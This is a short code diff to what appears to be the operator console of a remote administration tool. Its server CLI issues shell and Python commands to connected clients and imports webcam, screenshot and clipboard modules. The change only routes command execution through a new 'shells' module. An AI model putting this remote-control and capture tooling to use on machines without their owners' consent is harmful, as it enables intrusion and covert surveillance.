@@ -5,7 +5,7 @@ import socket
 from contextlib import suppress
 
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, filetransfer, screenshot, tasks, webcam, windows
+from modules import clipboard, download, filetransfer, screenshot, shells, tasks, webcam, windows
 from modules.baseserver import BaseServer
 from utils import terminal
 from utils.timeout_handler import TimeoutSetter
@@ -156,7 +156,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
             # Increase timeout for shell
             with TimeoutSetter(self.client, 60):
                 try:
-                    print(self.client.shell(command).decode(), end='')
+                    print(shells.shell(self.client, command), end='')
                 except TimeoutError:
                     logging.info('Shell command timed out: %s', self.client.id)
                     # Prompt user if they want to increase the timeout limit
@@ -179,7 +179,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
             # Increase timeout for interpreter
             with TimeoutSetter(self.client, 60):
                 try:
-                    print(self.client.python(command).decode(), end='')
+                    print(shells.python(self.client, command), end='')
                 except TimeoutError:
                     logging.info('Python command timed out: %s', self.client.id)
                     # Prompt user if they want to increase the timeout limit
